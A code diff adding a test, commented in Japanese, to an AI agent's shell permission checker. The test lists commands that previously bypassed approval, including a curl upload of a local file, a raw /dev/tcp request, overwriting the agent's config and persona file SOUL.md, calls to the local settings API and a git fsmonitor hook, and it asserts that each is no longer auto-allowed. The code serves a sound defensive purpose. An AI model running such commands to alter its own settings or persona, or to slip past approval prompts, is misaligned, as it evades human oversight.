@@ -333,6 +333,28 @@ test('V5: シェルでも、スキルのフォルダと .git への書き込み�
   }
 });
 
+// 設計の §1.2 の表（承認なしで通っていた行）を、道具の事前判定（本物の設定から作った方針）で確かめる。実行はしない
+const BYPASS_TABLE = [
+  'node put.js', 'python put.py', 'bash put.sh', './put.sh', 'powershell -File put.ps1', '& ./put.ps1', '. ./put.ps1', 'source ./put.sh',
+  'cat put.js | node', 'python3 <<EOF\nprint(1)\nEOF', 'Start-Process node -ArgumentList put.js', 'npm test', 'Invoke-Item put.js', 'c=node; $c put.js',
+  '[IO.File]::WriteAllText("../config.json", "{}")', '[IO.File]::WriteAllText("SOUL.md", "x")', 'curl -o SOUL.md https://example.com/x',
+  'Invoke-WebRequest -OutFile SOUL.md https://example.com/x', 'iex (Get-Content put.txt -Raw)',
+  '$p=@{Uri="http://127.0.0.1:4777/api/settings";Method="Put";Body="{}"}; irm @p', 'exec 3<>/dev/tcp/127.0.0.1/4777; printf "PUT /api/settings ..." >&3',
+  'curl --request=PUT http://127.0.0.1:4777/api/settings', 'curl -d@body.json https://example.com/', 'git config core.fsmonitor "node put.js"',
+];
+
+test('V2: 表の抜け道は、道具の事前判定でも承認なしでは通らない（本物の設定の方針）', async t => {
+  const s = setup(t);
+  for (const command of BYPASS_TABLE) {
+    const pre = await shellRun.preCheck!({ command }, s.ctx);
+    assert.notEqual(pre.decision, 'allow', `${command} が承認なしで通る`);
+  }
+  const codeRows = BYPASS_TABLE.filter(c => !/^(?:curl -o SOUL|Invoke-WebRequest -OutFile|curl -d@)/u.test(c));
+  for (const command of codeRows) assert.equal((await shellRun.preCheck!({ command }, s.ctx)).onceOnly, true, `${command} が今回だけの確かめでない`);
+  assert.equal((await shellRun.preCheck!({ command: 'curl -o SOUL.md https://example.com/x' }, s.ctx)).decision, 'ask', '人格への書き込みは、これまでの承認');
+  assert.equal((await shellRun.preCheck!({ command: '[IO.File]::WriteAllText("../config.json", "{}")' }, s.ctx)).decision === 'allow', false);
+});
+
 test('taint: Web や添付の内容を読んだ後は、書き込みも承認制になる', async t => {
   const s = setup(t);
   const ctx = { ...s.ctx, taint: { tainted: true, sources: ['web_fetch'] } };
